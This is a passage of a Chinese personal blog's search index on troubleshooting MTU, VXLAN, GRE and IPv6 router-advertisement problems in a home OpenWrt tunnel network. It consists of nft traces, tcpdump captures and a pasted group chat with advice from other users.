192.168.35.1</code>\uff0c\u8fd9\u91cc\u7684 ether daddr \u4e0d\u662f op1 \u7684 mac \u5730\u5740\uff0c\u800c\u662f op2 \u4e0a br-lan2 \u7684 mac \u5730\u5740\u3002\u8bf4\u660e nft bridge \u89c4\u5219\u751f\u6548\u4e86</li> </ul> <pre><code># \u624b\u673a sync\ntrace id 938d2a85 inet fw4 trace_chain packet: iif \"br-lan2\" ether saddr 5a:ff:4d:38:41:2f ether daddr ca:84:4a:ec:90:53 ip saddr 192.168.35.126 ip daddr 192.168.35.1 ip dscp cs0 ip ecn not-ect ip ttl 64 ip id 7498 ip protocol tcp ip length 60 tcp sport 49780 tcp dport 2202 tcp flags == syn tcp window 65535\n\ntrace id f67d6b7e inet fw4 mangle_forward packet: iif \"br-lan2\" oif \"br-lan2\"\ntrace id f67d6b7e inet fw4 mangle_forward rule iifname { \"br-lan2\", \"gre4t-gre3\" } tcp flags syn tcp option maxseg size set rt mtu comment \"!fw4: Zone lan2 IPv4/IPv6 ingress MTU fixing\" (verdict continue)\ntrace id f67d6b7e inet fw4 mangle_forward rule oifname { \"br-lan2\", \"gre4t-gre3\" } tcp flags syn tcp option maxseg size set rt mtu comment \"!fw4: Zone lan2 IPv4/IPv6 egress MTU fixing\" (verdict continue)\ntrace id f67d6b7e inet fw4 mangle_forward verdict continue\ntrace id f67d6b7e inet fw4 mangle_forward policy accept\ntrace id f67d6b7e inet fw4 forward packet: iif \"br-lan2\" oif \"br-lan2\"\ntrace id f67d6b7e inet fw4 forward rule iifname { \"br-lan2\", \"gre4t-gre3\" } jump forward_lan2 comment \"!fw4: Handle lan2 IPv4/IPv6 forward traffic\" (verdict jump forward_lan2)\ntrace id f67d6b7e inet fw4 forward_lan2 rule jump accept_to_lan2 (verdict jump accept_to_lan2)\ntrace id f67d6b7e inet fw4 accept_to_lan2 rule oifname { \"br-lan2\", \"gre4t-gre3\" } counter packets 283334 bytes 42471975 accept comment \"!fw4: accept lan2 IPv4/IPv6 traffic\" (verdict accept)\ntrace id f67d6b7e inet fw4 mangle_postrouting packet: iif \"br-lan2\" oif \"br-lan2\"\ntrace id f67d6b7e inet fw4 mangle_postrouting verdict continue\ntrace id f67d6b7e inet fw4 mangle_postrouting policy accept\n...\n\n# op1 \u8fd4\u56de sync\u540c\u6837\u7ecf\u8fc7\u4e86 MTU fix\ntrace id 3786311f inet fw4 trace_chain packet: iif \"br-lan2\" ether saddr 00:16:3e:4b:67:80 ether daddr 5a:ff:4d:38:41:2f ip saddr 192.168.35.1 ip daddr 192.168.35.126 ip dscp af21 ip ecn not-ect ip ttl 64 ip id 0 ip protocol tcp ip length 60 tcp sport 2202 tcp dport 49780 tcp flags == 0x12 tcp window 64860\n\ntrace id 3786311f inet fw4 prerouting packet: iif \"br-lan2\"\ntrace id 3786311f inet fw4 prerouting rule iifname { \"br-lan2\", \"gre4t-gre3\" } jump helper_lan2 comment \"!fw4: Handle lan2 IPv4/IPv6 helper assignment\" (verdict jump helper_lan2)\ntrace id 3786311f inet fw4 helper_lan2 verdict continue\ntrace id 3786311f inet fw4 prerouting verdict continue\ntrace id 3786311f inet fw4 prerouting policy accept\n\ntrace id 3786311f inet fw4 mangle_forward packet: iif \"br-lan2\" oif \"br-lan2\"\ntrace id 3786311f inet fw4 mangle_forward rule iifname { \"br-lan2\", \"gre4t-gre3\" } tcp flags syn tcp option maxseg size set rt mtu comment \"!fw4: Zone lan2 IPv4/IPv6 ingress MTU fixing\" (verdict continue)\ntrace id 3786311f inet fw4 mangle_forward rule oifname { \"br-lan2\", \"gre4t-gre3\" } tcp flags syn tcp option maxseg size set rt mtu comment \"!fw4: Zone lan2 IPv4/IPv6 egress MTU fixing\" (verdict continue)\ntrace id 3786311f inet fw4 mangle_forward verdict continue\ntrace id 3786311f inet fw4 mangle_forward policy accept\n...\n</code></pre>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#\u8865\u5145\u8bbf\u95ee-op2-lan1-\u4f18\u5316","title":"\u8865\u5145\uff1a\u8bbf\u95ee op2 lan1 \u4f18\u5316","text":"<p>\u867d\u7136 MTU \u95ee\u9898\u89e3\u51b3\u4e86\uff0c\u4f46\u662f\u8fde\u63a5 op2 wifi \u540e\u8bbf\u95ee op2 \u81ea\u8eab\u65f6\u4f1a\u53d1\u751f\u7ed5\u8def\u7684\u60c5\u51b5\uff08\u5373 op2 \u4e0a\u60f3\u8981\u4ece lan2 \u8bbf\u95ee lan\uff09\u3002</p> <p>\u4f8b\u5b50\uff1a\u76f4\u63a5 ping op2\uff0c\u4f1a\u53d1\u73b0\u5305\u4ece eth2 \u8fdb\u5165\u540e\uff0c\u4f1a\u4ece vxlan \u51fa\u53bb\uff0c\u518dwg_s2s \u56de\uff0c\u800c\u4e0d\u4f1a\u76f4\u63a5 eth2 -&gt; eth1\u3002\u8fd9\u53ef\u80fd\u662f\u56e0\u4e3a\u5305\u5df2\u7ecf\u88ab bridge \u62ff\u8d70\u4e86\uff0c\u6240\u4ee5\u4e0d\u4f1a eth2 -&gt; eth1\u3002\u8fd9\u5bfc\u81f4\u5b9e\u9645\u4e0a\u5ef6\u8fdf\u4ece 1ms \u53d8\u4e3a 2ms\u3002</p> <p>p.s \u5982\u679c op1 \u4e0a\u539f\u672c\u662f\u65e0\u6cd5\u8bbf\u95ee op2 \u7684\u8bdd\uff0c\u8fd9\u6837\u8fd8\u4f1a\u5bfc\u81f4\u8fde\u63a5 lan2 wifi \u65e0\u6cd5\u8bbf\u95ee lan \u7684\u60c5\u51b5\u3002</p> <pre><code>root@op2 \u279c  ~ tcpdump -ni any icmp and host 192.168.36.1\ntcpdump: data link type LINUX_SLL2\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes\n20:36:40.191286 eth2  P   IP 192.168.35.180 &gt; 192.168.36.1: ICMP echo request, id 1, seq 2028, length 40\n20:36:40.191305 vxlan0 Out IP 192.168.35.180 &gt; 192.168.36.1: ICMP echo request, id 1, seq 2028, length 40\n20:36:40.192829 wg_s2s In  IP 192.168.35.180 &gt; 192.168.36.1: ICMP echo request, id 1, seq 2028, length 40\n20:36:40.192862 br-lan2 Out IP 192.168.36.1 &gt; 192.168.35.180: ICMP echo reply, id 1, seq 2028, length 40\n20:36:40.192867 eth2  Out IP 192.168.36.1 &gt; 192.168.35.180: ICMP echo reply, id 1, seq 2028, length 40\n</code></pre> <p>\u89e3\u51b3\u529e\u6cd5\uff1a\u9488\u5bf9 lan1 \u7684\u5730\u5740\uff0c\u4e5f\u5c06 bridge \u8f6c\u6210 route \u5373\u53ef\u3002</p> <p>\u6539\u5b8c\u540e\u518d\u6293\u5305\uff0c\u53ef\u4ee5\u53d1\u73b0\u5305\u4ece br-lan2 \u5c31 Input \u4e86\uff0c\u4e0d\u50cf\u4e4b\u524d\u5f97\u7ed5\u8def\u4ece wg_s2s input \u7684\u60c5\u51b5\u3002</p> <pre><code>20:45:55.192422 eth2  P   IP 192.168.35.180.31195 &gt; 192.168.36.1.2202: Flags [.], ack 5648, win 8193, length 0\n20:45:55.192422 br-lan2 In  IP 192.168.35.180.31195 &gt; 192.168.36.1.2202: Flags [.], ack 5648, win 8193, length 0\n20:45:55.294526 br-lan2 Out IP 192.168.36.1.2202 &gt; 192.168.35.180.31195: Flags [P.], seq 5648:5852, ack 1, win 502, length 204\n20:45:55.294528 eth2  Out IP 192.168.36.1.2202 &gt; 192.168.35.180.31195: Flags [P.], seq 5648:5852, ack 1, win 502, length 204\n</code></pre>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#\u518d\u6b21\u603b\u7ed3\u4e0e\u601d\u8003","title":"\u518d\u6b21\u603b\u7ed3\u4e0e\u601d\u8003","text":"<p>\u867d\u7136\u6210\u529f\u89e3\u51b3\u4e86\uff0c\u73b0\u5728 moonlight UDP \u4e32\u6d41\u6ca1\u6709\u95ee\u9898\u4e86\u3002\u4f46\u662f\u53ef\u80fd\u7684\u95ee\u9898\u8fd8\u6709\uff1a</p> <ul> <li>\u73b0\u5728\u4e24\u7aef\u53d1\u9001\u548c\u63a5\u6536\u7684\u6bcf\u4e2a udp \u5305\uff0c\u90fd\u989d\u5916\u7ecf\u8fc7\u4e86\u4e00\u6b21\u5206\u7247\u548c\u5408\u5e76\uff0c\u662f\u5426\u5bf9\u6027\u80fd\u6709\u8f83\u5927\u5f71\u54cd\uff1f</li> <li>\u540c\u4e00\u4fa7\u7684\u673a\u5668\u95f4\u8bbf\u95ee\uff0c\u662f\u5426\u4e5f\u9700\u8981\u8def\u7531\u5668\u8f6c\u53d1\uff1f\u8fd9\u6837\u662f\u5426\u6709\u6027\u80fd\u5f71\u54cd<ul> <li>\u53d1\u73b0\u5c45\u7136\u4e0d\u662f\uff0c\u56e0\u4e3a\u540c\u4e00\u4fa7\u7684\u673a\u5668\u5927\u90e8\u5206\u5728\u8fdb\u5165 openwrt \u4e4b\u524d\uff0c\u5c31\u5df2\u7ecf\u5728 pve host \u7684 vmbr \u4e0a\u5df2\u7ecf\u8fdb\u884c\u8f6c\u53d1\u4e86\u3002</li> </ul> </li> </ul>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#\u901a\u8fc7-dhcp-option-\u8bbe\u7f6e\u6240\u6709\u8bbe\u5907-mtu","title":"\u901a\u8fc7 DHCP option \u8bbe\u7f6e\u6240\u6709\u8bbe\u5907 MTU","text":"<p>\u53ea\u8981 dhcp server \u542f\u7528\u4e86 mtu option\uff0c\u597d\u50cf\u4e3b\u6d41\u7cfb\u7edf\u90fd\u4f1a\u4f7f\u7528\u3002\u6b63\u597d\u6211\u7684 360t7 \u65e0\u6cd5\u4f7f\u7528 nft bridge \u547d\u4ee4\u5bfc\u81f4\u5206\u7247\u635f\u8017\u5f88\u5927\uff0c\u53ef\u4ee5\u8bd5\u4e00\u8bd5\u8be5\u65b9\u6848\u3002</p>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#vlan-\u5207\u6362\u65b9\u6848","title":"VLAN \u5207\u6362\u65b9\u6848","text":"<ul> <li>\u907f\u514d\u9700\u8981\u53cd\u590d\u63d2\u62d4\u7f51\u7ebf\u6765\u5207\u6362 AP \u6240\u5728\u7684 lan</li> <li>AP \u53ea\u7528\u5355\u6839\u7f51\u7ebf \u8fde\u63a5\u8def\u7531\u5668</li> <li>\u6ce8\uff1a\u8fd9\u91cc\u4f7f\u7528\u4e86 vxlan</li> </ul>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#windows-\u83b7\u5f97\u9519\u8bef\u7684-v6-\u5730\u5740ra-\u8de8\u4e86\u7f51\u6bb5","title":"windows \u83b7\u5f97\u9519\u8bef\u7684 v6 \u5730\u5740\uff08RA \u8de8\u4e86\u7f51\u6bb5\uff09","text":"<p>\u7b14\u8bb0\u672c\u901a\u8fc7\u7f51\u7ebf\u8fde\u63a5\u5230 AX6S AP\u3002\u7531\u4e8e\u6bcf\u4e2a\u7aef\u53e3\u914d\u7f6e\u4e86 10 \u4f5c\u4e3a pvid\uff0c\u5e76\u4e14 10 \u662f untagged \u7684\uff0c\u56e0\u6b64\u7b14\u8bb0\u672c\u76f8\u5f53\u4e8e\u63a5\u5165\u4e86 VLAN10\u3002</p> <p>\u4f46\u662f\u7b14\u8bb0\u672c\u4e0d\u77e5\u4e3a\u4f55\u603b\u4f1a\u83b7\u5f97 VLAN20 \u7684 ipv6 \u5730\u5740\uff0c\u800c\u8be5\u5730\u5740\u662f\u65e0\u6cd5\u4f7f\u7528\u7684\u3002\u5bfc\u81f4\u8bbf\u95ee B \u7ad9\u65f6\u53ef\u80fd\u9047\u5230\u5947\u602a\u7684\u5361\u987f\uff0c\u4e0a\u7f51\u4f53\u9a8c\u5f88\u5dee\u3002</p> <p>tcpdump \u589e\u52a0 -e\uff0c\u663e\u793a\u4ee5\u592a\u7f51\u5e27\u540e\u53d1\u73b0\u4e86\u95ee\u9898\u3002</p> <ul> <li>\u7531\u4e8e\u6bcf\u4e2a port \u540c\u65f6\u914d\u7f6e\u4e86 vlan 10 \u548c vlan 20\uff0c\u56e0\u6b64\u53ea\u8981\u8def\u7531\u5668\u53d1\u9001 RA\uff0c\u5c31\u4f1a\u5728\u6240\u6709\u63a5\u53e3\u4e0a\u53d1\uff0c\u4e0d\u8fc7\u4f1a\u5e26\u4e0a vlan id\u3002</li> <li>windows \u63a5\u6536\u5230 tagged \u7684\u5305\uff0c\u5e76\u4e0d\u4f1a\u4e22\u5f03\uff0c\u800c\u662f\u6b63\u5e38\u63a5\u6536\uff0c\u8fd9\u5bfc\u81f4\u9519\u8bef\u5730\u914d\u7f6e\u4e86 SLAAC \u7684\u5730\u5740\u3002</li> </ul> <p>\u7531\u4e8e\u6bcf\u4e2a\u63a5\u53e3\u6bcf 5 \u5206\u949f\u5bf9\u6240\u6709\u8282\u70b9\u53d1\u9001\u4e00\u6b21 RA\uff0c\u4ee5\u4e0b\u662f\u6293\u5230\u7684 op2 \u548c op1 \u5e7f\u64ad\u7684 ra \u6d88\u606f\u3002\u53ea\u8981\u4e00\u63a5\u6536\u5230\u8be5\u6d88\u606f\uff0cwindows \u5c31\u4f1a\u51fa\u73b0\u9519\u8bef\u7684 v6 \u5730\u5740\u3002</p> <pre><code>root@ax6s \u279c  ~ tcpdump -nei lan3 -vvvv -tttt \"icmp6 and (ip6[40] == 134 or ip6[40] == 133)\" # rs, ra\n\n2024-08-05 01:12:58.032179 d2:c8:4c:f9:52:a2 &gt; 33:33:00:00:00:01, ethertype 802.1Q (0x8100), length 178: vlan 10, p 0, ethertype IPv6 (0x86dd), (flowlabel 0x0f2eb, hlim 255, next-header ICMPv6 (58) payload length: 120) fe80::d0c8:4cff:fef9:52a2 &gt; ff02::1: [icmp6 sum ok] ICMP6, router advertisement, length 120\n        hop limit 64, Flags [other stateful], pref medium, router lifetime 1800s, reachable time 0ms, retrans timer 0ms\n          source link-address option (1), length 8 (1): d2:c8:4c:f9:52:a2\n            0x0000:  d2c8 4cf9 52a2\n          mtu option (5), length 8 (1):  1492\n            0x0000:  0000 0000 05d4\n          prefix info option (3), length 32 (4): 2409:8a30:4ae:a540::/64, Flags [onlink, auto], valid time 258681s, pref. time 172281s\n            0x0000:  40c0 0003 f279 0002 a0f9 0000 0000 2409\n            0x0010:  8a30 04ae a540 0000 0000 0000 0000\n          route info option (24), length 24 (3):  2409:8a30:4ae:a540::/60, pref=medium, lifetime=1800s\n            0x0000:  3c00 0000 0708 2409 8a30 04ae a540 0000\n            0x0010:  0000 0000 0000\n          rdnss option (25), length 24 (3):  lifetime 1800s, addr: 2409:8a30:4ae:a540::10\n            0x0000:  0000 0000 0708 2409 8a30 04ae a540 0000\n            0x0010:  0000 0000 0010\n          advertisement interval option (7), length 8 (1):  600000ms\n            0x0000:  0000 0009 27c0\n2024-08-05 01:13:36.201962 00:16:3e:4b:67:80 &gt; 33:33:00:00:00:01, ethertype 802.1Q (0x8100), length 154: vlan 20, p 0, ethertype IPv6 (0x86dd), (flowlabel 0x31634, hlim 255, next-header ICMPv6 (58) payload length: 96) fe80::216:3eff:fe4b:6780 &gt; ff02::1: [icmp6 sum ok] ICMP6, router advertisement, length 96\n        hop limit 64, Flags [managed, other stateful], pref medium, router lifetime 1800s, reachable time 0ms, retrans timer 0ms\n          source link-address option (1), length 8 (1): 00:16:3e:4b:67:80\n            0x0000:  0016 3e4b 6780\n          mtu option (5), length 8 (1):  1370\n            0x0000:  0000 0000 055a\n          prefix info option (3), length 32 (4): 2001:da8:d800:c019::/64, Flags [onlink, auto], valid time 2443865s, pref. time 456665s\n            0x0000:  40c0 0025 4a59 0006 f7d9 0000 0000 2001\n            0x0010:  0da8 d800 c019 0000 0000 0000 0000\n          rdnss option (25), length 24 (3):  lifetime 1800s, addr: fe80::216:3eff:fe4b:6780\n            0x0000:  0000 0000 0708 fe80 0000 0000 0000 0216\n            0x0010:  3eff fe4b 6780\n          advertisement interval option (7), length 8 (1):  600000ms\n            0x0000:  0000 0009 27c0\n</code></pre> <p>\u89e3\u51b3\u65b9\u6cd5\uff1a\u8bbe\u7f6e lan2 \u53ea\u80fd\u901a\u8fc7 wifi \u63a5\u5165\uff0c\u6240\u6709 lan \u7aef\u53e3\u90fd\u4e0d\u52a0\u5165 vlan20\uff08\u6ce8\u610f\uff0cwan \u7528\u4e8e\u8fde\u63a5\u4e0a\u7ea7\u8def\u7531\u5668 op2\uff0c\u56e0\u6b64\u9700\u8981\u4fdd\u7559 vlan20\uff09</p> <p></p>","tags":["MTU","PMTUD","MSS","fragment","GRE"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/03/15/MTU%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%28%E4%BA%8C%E5%B1%82%E9%9A%A7%E9%81%93%E7%BB%84%E7%BD%91%29/#202412-\u66f4\u65b0-l2tpv3failed","title":"2024/12 \u66f4\u65b0 L2TPv3\uff08failed\uff09","text":"<p>\u8bf7\u6559\u4e00\u4e0b\u7fa4\u5185\u5927\u4f6c\u5173\u4e8e vxlan \u7684\u95ee\u9898\uff0c\u6211\u73b0\u5728\u6709 B \u548c C \u4e24\u4e2a\u8bbe\u5907\u901a\u8fc7 vxlan \u8fde\u63a5\u5230 A\uff0cB \u548c C \u90fd\u80fd\u8bbf\u95ee A\uff0c\u4f46\u662f B \u548c C \u4e4b\u95f4\u4e0d\u901a\uff0c\u8bf7\u95ee\u8fd9\u662f\u9ed8\u8ba4\u884c\u4e3a\u5417\uff1fB \u8bbf\u95ee C \u65f6\uff0ctcpdump \u6293\u5305\u80fd\u5728 A \u4e0a\u6293\u5230 arp \u4f46\u662f\u6ca1\u6709\u54cd\u5e94\u3002</p> <p>vxlan \u4e0d\u901a\u7684\u539f\u56e0</p> <ul> <li>A \u5728 vxlan0 \u4e0a\u6536\u5230 B -&gt; C \u7684\u5305\uff0cmac \u5730\u5740\u662f B -&gt; C\uff0c\u4e0d\u662f\u81ea\u5df1\u7684\uff0c\u76f4\u63a5\u4e22\u5f03\u3002<ul> <li>\u5982\u679c\u6709 hairpin \u529f\u80fd\uff0c\u4e5f\u8bb8\u53ef\u884c</li> </ul> </li> <li>vxlan \u8bbe\u8ba1\u7684\u662f\u591a\u4e2a\u673a\u5668\u901a\u8fc7\u865a\u62df\u7aef\u53e3\u95f4\u901a\u4fe1\uff0c\u5c31\u50cf\u5728\u4e00\u4e2a\u4ea4\u6362\u673a\u4e0a\u3002\u6211\u8fd9\u91cc\u7684\u60c5\u51b5\uff0c\u53d8\u6210\u4e86\u5e0c\u671b\u4ece\u4e00\u4e2a\u7aef\u53e3\u6765\u56de\u4e00\u8d9f\u3002</li> </ul> <p>\u610f\u8bc6\u5230 gre \u548c vxlan \u8fd9\u6837\u7684\u534f\u8bae\u6ca1\u6709\u5904\u7406 MTU \u95ee\u9898\uff0c\u662f\u56e0\u4e3a\u4ed6\u4eec\u7684\u5e94\u7528\u573a\u666f\u3002GRE tap\u786e\u5b9e\u6ca1\u60f3\u5230\u53ea\u80fd\u5728\u4e24\u4e2a\u8bbe\u5907\u95f4 L2 \u8fde\u63a5\u6709\u4ec0\u4e48\u7528\u3002 vxlan \u7528\u4e8e\u5b9e\u73b0\u4e0d\u540c VTEP \u4e4b\u95f4\u591a\u5bf9\u591a\u8fde\u63a5\uff08\u5e95\u5c42\u6700\u597d\u57fa\u4e8e\u591a\u64ad\uff0c\u6216\u8005\u5728\u4e00\u4e2a\u4e8c\u5c42\u5185\uff0c\u591a\u8df3\u7684\u7f51\u7edc\u6269\u5c55\u6027\u4e0d\u597d\uff09\uff0c\u53ef\u4ee5\u7528\u4e8e\u6570\u636e\u4e2d\u5fc3\u8fde\u63a5\u591a\u4e2a\u673a\u67dc\u4e2d\u7684\u865a\u62df\u673a\u3002 \u81f3\u4e8e\u4e8c\u5c42\u7ec4\u7f51\u573a\u666f\uff0c\u4f01\u4e1a\u4f7f\u7528\u7684\u534f\u8bae\u662f L2TPv3 \u8fd9\u79cd\u534f\u8bae\uff0cv3 \u662f\u7248\u672c\u53f7\u3002L2TPv3 \u5e76\u4e14\u53ef\u4ee5\u548c\u666e\u901a\u4ee5\u592a\u7f51\u6865\u63a5\u8d77\u6765\uff0c\u652f\u6301\u5904\u7406\u5206\u7247\u3002\u5173\u952e\u8bcd\u4e3a L2TPv3 Pseudowire</p> <p>\u53d1\u73b0\u4ecd\u7136\u8fd8\u662f\u4e0d\u884c\uff0c\u5c06\u4e0d\u540c MTU \u63a5\u53e3 bridge \u5728\u4e00\u8d77\u8fd8\u662f\u6709\u95ee\u9898</p> <pre><code>TheRainstorm, [2024/12/7 15:17]\n\u8bf7\u6559\u4e00\u4e0b\u7fa4\u5185\u5927\u4f6c\u5173\u4e8e vxlan \u7684\u95ee\u9898\uff0c\u6211\u73b0\u5728\u6709 B \u548c C \u4e24\u4e2a\u8bbe\u5907\u901a\u8fc7 vxlan \u8fde\u63a5\u5230 A\uff0cB \u548c C \u90fd\u80fd\u8bbf\u95ee A\uff0c\u4f46\u662f B \u548c C \u4e4b\u95f4\u4e0d\u901a\uff0c\u8bf7\u95ee\u8fd9\u662f\u9ed8\u8ba4\u884c\u4e3a\u5417\uff1fB \u8bbf\u95ee C \u65f6\uff0ctcpdump \u6293\u5305\u80fd\u5728 A \u4e0a\u6293\u5230 arp \u4f46\u662f\u6ca1\u6709\u54cd\u5e94\u3002\n\nTheRainstorm, [2024/12/7 15:19]\n\u521b\u5efa vxlan \u7684\u547d\u4ee4\uff1aip link add vxlan0 type vxlan id 8 remote xxx dev eth0 dstport 4789\n\nCiel, [2024/12/7 15:19]\n\u770b\u8d77\u6765\u4f60\u7684A\u6ca1\u6709\u5904\u7406\u8f6c\u53d1\uff08\uff1f\n\nTheRainstorm, [2024/12/7 15:20]\nA \u662f openwrt\uff0c\u8f6c\u53d1\u662f\u5f00\u7684\u3002\u5e76\u4e14\u7406\u8bba\u4e0a in \u548c out \u7684\u63a5\u53e3\u90fd\u662f vxlan0\uff0c\u6240\u4ee5\u5e94\u8be5\u4e5f\u6ca1\u6709\u9632\u706b\u5899\u95ee\u9898\uff1f\n\nMiao Wang, [2024/12/7 15:20]\n\u4f60 abc \u4e09\u4e2a\u673a\u5668\u4e0a vxlan \u7f51\u7edc\u7684 IP \u662f\u540c\u4e00\u4e2a\u7f51\u6bb5\uff1f\n\nTheRainstorm, [2024/12/7 15:22]\n\u662f\u7684\uff0c\u90fd\u662f A \u4e0a dhcp \u4e0b\u53d1\u7684\u5730\u5740\u3002B \u662f\u6211\u624b\u52a8\u6dfb\u52a0\u7684\u9759\u6001\u5730\u5740\u3002A \u4e0a\u5c06 vxlan0 \u548c eth0 bridge \u5230\u4e86\u4e00\u8d77\u3002B \u548c C \u90fd\u80fd\u8bbf\u95ee A \u7684 eth0 \u4e0b\u8bbe\u5907\uff0c\u4f46\u662f\u4e4b\u95f4\u5c31\u4e0d\u4e92\u901a\n\nMiao Wang, [2024/12/7 15:22]\n\u8fd9\u662f\u671f\u5f85\u7684\u73b0\u8c61\n\nMiao Wang, [2024/12/7 15:22]\nvxlan \u96a7\u9053\u662f\u4e2a\u591a\u70b9\u7684\u96a7\u9053\n\nMiao Wang, [2024/12/7 15:23]\n\u91cc\u9762\u6709\u4e2a\u8f6c\u53d1\u8868\n\nMiao Wang, [2024/12/7 15:23]\n\u5199\u660e\u6307\u5b9a\u7684 mac \u5730\u5740\u8981\u53d1\u5230\u54ea\u4e2a\u96a7\u9053\u7aef\u70b9\n\nMiao Wang, [2024/12/7 15:23]\n\u800c\u4f60 ip link add \u91cc\u7684 remote \u662f\u6307\u6ca1\u6709\u67e5\u5230\u7684\u9ed8\u8ba4\u76ee\u6807\n\nMiao Wang, [2024/12/7 15:24]\n\u6240\u4ee5\u5f53 B \u8bbf\u95ee C \u7684\u65f6\u5019\uff0c\u76f8\u5f53\u4e8e\u662f A \u6536\u5230\u4e86 B \u53d1\u7ed9 C \u7684\u5305\uff0c\u4e0d\u662f\u53d1\u7ed9\u81ea\u5df1\u7684\uff0c\u4e22\u6389\n\nMiao Wang, [2024/12/7 15:25]\n\u5bf9\u4e8e\u4f60\u7684\u9700\u6c42\uff0c\u770b\u4f60 B \u548c C \u7684\u8bbf\u95ee\uff0c\u5230\u5e95\u4f60\u662f\u5426\u60f3\u8981\u7ecf\u7531 A \u8f6c\u53d1\n\nMiao Wang, [2024/12/7 15:26]\n\u5982\u679c\u9700\u8981\uff0c\u90a3\u4e48\u53ef\u80fd\u7684\u4e00\u4e2a\u64cd\u4f5c\u662f\u5728 A \u7684 vxlan \u63a5\u53e3\u4e0a\u5f00 hairpin\uff08\u6211\u6ca1\u8bd5\u8fc7\uff09\n\nMiao Wang, [2024/12/7 15:27]\n\u4f60\u628a\u4ee5\u592a\u7f51\u548c vxlan bridge \u8d77\u6765\u90fd\u662f\u4e0d\u5bf9\u7684\n\nMiao Wang, [2024/12/7 15:27]\n\u56e0\u4e3a\u5b83\u4eec mtu \u4e0d\u4e00\u6837\n\nMiao Wang, [2024/12/7 15:27]\n\u800c vxlan \u4e0d\u652f\u6301\u5206\u7247\n\nTheRainstorm, [2024/12/7 15:29]\n\u8fd9\u4e2a\u786e\u5b9e\uff0c\u6211\u4e4b\u524d\u8e29\u4e86\u8fd9\u4e2a\u5751\u3002\u540e\u9762\u53d1\u73b0\u4f7f\u7528 add rule bridge gre_tap_fix_mtu c1 meta iifname eth1 ip daddr 192.168.35.0/24 meta pkttype set host ether daddr set 00:16:3e:4b:67:80 counter \u8fd9\u6837\u4e00\u6761 nft \u547d\u4ee4\u53ef\u4ee5\u89e3\u51b3\n\nTheRainstorm, [2024/12/7 15:30]\n\u5c31\u662f nft \u4fee\u6539\u4e0b\u76ee\u7684 mac \u5730\u5740\uff0c\u6539\u4e3a A \u7684 bridge mac \u5730\u5740\u3002\u8fd9\u6837 A \u5c31\u4f1a\u5bf9\u5305\u5728 3 \u5c42\u8fdb\u884c\u8f6c\u53d1\u4e00\u6b21\n\nMiao Wang, [2024/12/7 15:31]\n\u54e6\uff0c\u90a3\u4e5f\u4e0d\u662f\u4e0d\u53ef\u4ee5\n\nTheRainstorm, [2024/12/7 15:32]\nA \u8f6c\u53d1\u7684\u540c\u65f6\u5c31\u4f1a\u5206\u7247\u4e86\uff0c\u540c\u65f6\u4e5f\u53ef\u4ee5\u4f7f\u7528 MSS clamping \u4fee\u6539 TCP \u8fde\u63a5\u7684 MSS \u6765\u907f\u514d\u5206\u7247\n\nMiao Wang, [2024/12/7 15:33]\n\u4e0d\u662f\uff0c\u6211\u662f\u8bf4 B \u548c\u4f60\u88ab\u6865\u8d77\u6765\u7684 eth0 \u91cc\u9762\u7684\u8bbe\u5907\u7684\u901a\u4fe1\n\nMiao Wang, [2024/12/7 15:36]\n\u56e0\u4e3a\u8fd9\u79cd\u901a\u4fe1\u4e0d\u4e00\u5b9a\u662f tcp\uff0c\u8f6e\u4e0d\u5230\u4f60\u6539 mss\uff1b\u800c\u4e14\u6709\u4e9b\u5e94\u7528\uff08\u6bd4\u5982\u8def\u7531\u534f\u8bae\uff09\u8fd8\u5bf9\u8df3\u6570\u6709\u8981\u6c42\uff0c\u4f60\u8fd9\u4e2a\u7531 A \u4e09\u5c42\u8f6c\u53d1\u7684\u8bdd\uff0c\u5c31\u591a\u51fa\u6765\u4e86\u4e00\u8df3\n\nMiao Wang, [2024/12/7 15:37]\n\u6211\u7ed9\u4f60\u4e00\u4e2a\u4e00\u52b3\u6c38\u9038\u7684\u5efa\u8bae\u662f\uff0cB \u548c C \u5206\u522b\u5efa\u7acb\u4e00\u4e2a l2tpv3 \u7684\u96a7\u9053\uff0c\u5728 A \u4e0a\u628a\u4e24\u4e2a\u96a7\u9053\u63a5\u53e3\u548c eth0 \u6865\u8d77\u6765\n\nMiao Wang, [2024/12/7 15:37]\nvxlan \u4e0d\u9002\u5408\u4f60\u8fd9\u79cd\u573a\u666f\n\nMiao Wang, [2024/12/7 15:37]\nl2tpv3 \u662f\u70b9\u5230\u70b9\u7684\u96a7\u9053\uff0c\u800c\u4e14\u652f\u6301\u5206\u7247\n\nTheRainstorm, [2024/12/7 15:39]\n\u5c31\u662f\u672c\u6765 B \u662f\u76f4\u63a5\u53d1\u7ed9 eth0 \u4e0b\u7684\u8bbe\u5907 